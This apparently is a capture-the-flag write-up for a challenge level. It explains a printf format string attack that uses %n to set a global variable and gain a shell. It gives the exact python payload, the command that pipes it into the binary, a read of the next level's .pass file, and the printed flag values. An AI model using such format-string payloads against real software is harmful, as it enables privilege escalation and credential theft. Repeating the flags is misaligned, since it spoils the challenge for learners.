# Level3

```bash
su level3 # 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Steps
This binary uses `fgets`, which is protected against **buffer overflow attacks**.   
It does a call to `/bin/sh` but only when `obj.m = 64`.    
```bash
obj.m address = 0x804988c
```

Thanks to `printf` we can perform a **format string attack**.    
- The `%n` modifier will write the number of printed characters at address pointed by its associated parameter.    
- We can specify which parameter to use for `%n` by including the `x$` modifier, `x+1` on this modifier will reach `4` bytes further up on the stack allowing us to reach inside our buffer.

```bash
python -c "print '\x08\x04\x98\x8c'[::-1] + 'A' * 60 + '%4\$n'" > /tmp/inj3
cat /tmp/inj3 - | ./level3
Wait what?!

cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
